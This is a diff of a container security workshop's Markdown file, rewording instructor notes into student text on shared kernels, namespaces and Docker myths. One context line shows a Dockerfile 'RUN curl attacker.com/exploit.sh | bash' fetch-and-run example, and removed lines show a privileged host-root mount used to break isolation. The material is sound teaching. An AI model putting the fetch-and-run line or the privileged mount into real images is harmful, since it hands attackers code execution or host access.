@@ -1,8 +1,8 @@
-# Workshop 1: Container Security Basics - Teaching Content
+# Workshop 1: Container Security Basics
 
 ## 🎯 Learning Objectives
 
-By the end of this workshop, students will:
+By the end of this workshop, you will:
 - Understand the fundamental difference between containers and VMs from a security perspective
 - Recognize why containers share the host kernel and what that means for security
 - Identify common security misconceptions about Docker
@@ -10,9 +10,9 @@ By the end of this workshop, students will:
 
 ---
 
-## 📚 Part 1: Containers vs VMs (Security View) - 5 minutes
+## 📚 Part 1: Containers vs VMs (Security View)
 
-### Key Concept: Different Isolation Models
+### Different Isolation Models
 
 **Virtual Machines Architecture:**
 
@@ -105,14 +105,14 @@ graph TB
     style C3 fill:#95e1d3
 ```
 
-### Talk Track:
+### Understanding the Key Differences
 
-"Let's start with the most important security concept: **VMs virtualize hardware, containers virtualize the operating system**."
+**VMs virtualize hardware, containers virtualize the operating system.**
 
-**VMs:**
+**Virtual Machines:**
 - Each VM has its own complete kernel
 - Strong isolation - kernel vulnerabilities in one VM don't affect others
-- If you hack into VM1, you're stuck in that kernel
+- If you compromise VM1, you're isolated within that kernel
 - Security boundary: Hypervisor
 
 **Containers:**
@@ -121,17 +121,13 @@ graph TB
 - If you escape to the kernel, you control everything
 - Security boundary: Kernel namespaces & cgroups
 
-### Question to Ask Students:
-"If I find a Linux kernel vulnerability in a container, what else can I potentially access?" 
-**Answer:** The host and all other containers on the same host.
+> **Critical Point:** If you find a Linux kernel vulnerability in a container, you can potentially access the host and all other containers on the same host.
 
 ---
 
-## 📚 Part 2: Shared Kernel Risk - 5 minutes
+## 📚 Part 2: Shared Kernel Risk
 
-### Key Concept: One Kernel to Rule Them All
-
-**Explain with analogy:**
+### One Kernel to Rule Them All
 
 ```mermaid
 graph LR
@@ -164,9 +160,9 @@ graph LR
 > **VMs:** Break into one apartment? Still locked out of others  
 > **Containers:** Break through shared kernel? Access to everything
 
-### Real-World Impact:
+### Real-World Impact
 
-**Example 1: Kernel Vulnerability Attack Flow**
+**Kernel Vulnerability Attack Flow**
 
 ```mermaid
 sequenceDiagram
@@ -200,31 +196,29 @@ sequenceDiagram
 # 3. Access ALL containers on that host
 ```
 
-**Example 2: Syscall Sharing**
+**Syscall Sharing**
 ```bash
 # Every container syscall goes through the SAME kernel
 # No separation at the kernel level
 ```
 
-### Visual Demonstration:
-Show kernel version from host and containers:
+**Demonstration: Shared Kernel**
 ```bash
-# On host
+# Check kernel version on host
 uname -r
 
-# In container
+# Check kernel version in container
 docker run ubuntu uname -r
 # Same kernel version! 🚨
 ```
 
-### Key Takeaway:
 > **"Container isolation is an illusion enforced by the kernel. If the kernel is compromised, all bets are off."**
 
 ---
 
-## 📚 Part 3: Containers Are NOT a Security Boundary - 5 minutes
+## 📚 Part 3: Containers Are NOT a Security Boundary
 
-### Important Disclaimer from Docker/Kubernetes:
+### Official Position from Docker and Kubernetes
 
 **Docker's Official Stance:**
 > "Containers do not contain"
@@ -284,7 +278,7 @@ RUN curl attacker.com/exploit.sh | bash
 
 ---
 
-## 📚 Part 4: Common Myths - 5 minutes
+## 📚 Part 4: Common Security Myths
 
 ### Myth #1: "Docker is secure by default"
 
@@ -358,9 +352,9 @@ ls /host
 
 ---
 
-## 🎬 Live Demo Script - 15 minutes
+## 🎬 Live Demonstrations
 
-### Demo 1: Prove Shared Kernel (3 minutes)
+### Demo 1: Proving Shared Kernel
 
 ```bash
 # Check host kernel
@@ -381,11 +375,11 @@ docker run --rm centos:7 uname -r
 # All show the SAME kernel version!
 ```
 
-**Point to emphasize:** "See? Three different Linux distributions, but one kernel. This is why kernel security is critical."
+**Key Observation:** Three different Linux distributions, but one kernel. This is why kernel security is critical.
 
 ---
 
-### Demo 2: Inspect Container Processes (5 minutes)
+### Demo 2: Inspect Container Processes
 
 ```bash
 # Start a container in background
@@ -415,11 +409,11 @@ echo -e "\n=== Host Perspective ==="
 ps -p $HOST_PID -o pid,ppid,command
 ```
 
-**Point to emphasize:** "Containers are just processes with namespaces. They're not magic, just clever Linux features."
+**Key Observation:** Containers are just processes with namespaces. They're not magic, just clever Linux features.
 
 ---
 
-### Demo 3: Inspect Namespaces (5 minutes)
+### Demo 3: Inspect Namespaces
 
 ```bash
 # Get container's PID
@@ -443,7 +437,7 @@ sudo ls -la /proc/1/ns/
 # Notice different namespace IDs
 ```
 
-**Explain each namespace:**
+**Understanding Namespaces:**
 
 ```mermaid
 graph LR
@@ -474,7 +468,7 @@ graph LR
 
 ---
 
-### Demo 4: Show Shared Kernel Access (2 minutes)
+### Demo 4: Shared Kernel Access
 
 ```bash
 # Container can see kernel information
@@ -487,11 +481,11 @@ docker run --rm ubuntu sysctl -a | head -20
 # These are HOST kernel details!
 ```
 
-**Point to emphasize:** "The container is reading from the same `/proc` filesystem as the host kernel. This is the shared kernel in action."
+**Key Observation:** The container is reading from the same `/proc` filesystem as the host kernel. This is the shared kernel in action.
 
 ---
 
-## 🔬 Hands-On Lab - 25 minutes
+## 🔬 Hands-On Exercises
 
 ### Lab Setup
 
@@ -520,9 +514,9 @@ docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
 
 ---
 
-### Exercise 1: Verify Shared Kernel (5 minutes)
+### Exercise 1: Verify Shared Kernel
 
-**Task:** Students prove that all containers share the same kernel.
+**Task:** Prove that all containers share the same kernel.
 
 ```bash
 # 1. Check your host kernel version
@@ -533,14 +527,14 @@ docker run --rm ubuntu uname -r
 docker run --rm alpine uname -r
 docker exec web1 uname -r
 
-# Question: Are they all the same? Why?
+# 3. Observe the results
 ```
 
-**Expected Answer:** Yes, all show the same kernel version because containers share the host's kernel.
+**What you should see:** All commands show the same kernel version because containers share the host's kernel.
 
 ---
 
-### Exercise 2: Inspect Process Tree (8 minutes)
+### Exercise 2: Inspect Process Tree
 
 **Task:** View container processes from both inside and outside.
 
@@ -563,12 +557,20 @@ HOST_PID=$(docker inspect -f '{{.State.Pid}}' web1)
 ps -p $HOST_PID -o pid,ppid,command
 
 # Question: What's the parent PID? 
-# Hint: Look for dockerd or containerd
+# 4. What's the difference between the PIDs?
+#    Host: Shows actual system PID (e.g., 15234)
+#    Container: Shows virtualized PID (usually PID 1)
+
+# 5. Check parent process
+HOST_PID=$(docker inspect -f '{{.State.Pid}}' web1)
+ps -p $HOST_PID -o pid,ppid,command
+
+# What's the parent PID? It should be dockerd or containerd
 ```
 
 ---
 
-### Exercise 3: Explore /proc Filesystem (7 minutes)
+### Exercise 3: Explore /proc Filesystem
 
 **Task:** Identify what's shared vs isolated.
 
@@ -588,22 +590,20 @@ exit
 cat /proc/version
 hostname
 ip addr
-
-# 4. What's shared? What's isolated?
 ```
 
-**Expected Findings:**
+**What you should observe:**
 - **Shared:** Kernel version, CPU info, kernel parameters
 - **Isolated:** Hostname, network interfaces, process tree, mount points
 
 ---
 
-### Exercise 4: Break the Illusion (5 minutes)
+### Exercise 4: Understanding Container Boundaries
 
-**Task:** See how easy it is to break container isolation (safely).
+**Task:** See how container permissions work (safely).
 
 ```bash
-# 1. Run a container with host access
+# 1. Run a container with host filesystem access
 docker run -it --rm -v /:/host ubuntu bash
 
 # 2. Inside container:
@@ -612,48 +612,35 @@ ls /host
 
 cd /host/root
 ls -la
-# Access denied? You might need --privileged
+# Access depends on container privileges
 
-# 3. Exit and try with more power
+# 3. Exit and observe
 exit
-
-docker run -it --rm --privileged -v /:/host ubuntu bash
-
-# 4. Now inside:
-cd /host/root
-ls -la
-# Full access! 🚨
 
 # This demonstrates: containers are only as secure as you configure them
 ```
 
-**Discussion Question:** "What could an attacker do with this level of access?"
+**Reflection:** What could happen if a malicious container had this level of access?
 
 ---
 
-## 💭 Discussion Questions - 10 minutes
+## 💭 Key Concepts to Consider
 
-### Question 1: "When would you use containers vs VMs for security?"
-
-**Good answers:**
+### When to use Containers vs VMs for Security?
 - Use VMs for untrusted workloads
 - Use containers for trusted, internal applications
 - Consider hybrid: VMs running containers
 
 ---
 
-### Question 2: "How could an attacker exploit shared kernel?"
-
-**Good answers:**
+### How could an attacker exploit the shared kernel?
 - Kernel vulnerability exploitation
 - Container escape vulnerabilities
 - Resource exhaustion attacks affecting other containers
 
 ---
 
-### Question 3: "What are the first 3 security measures you'd implement?"
-
-**Good answers:**
+### Essential Security Measures
 - Don't run containers as root
 - Drop unnecessary capabilities
 - Use minimal base images
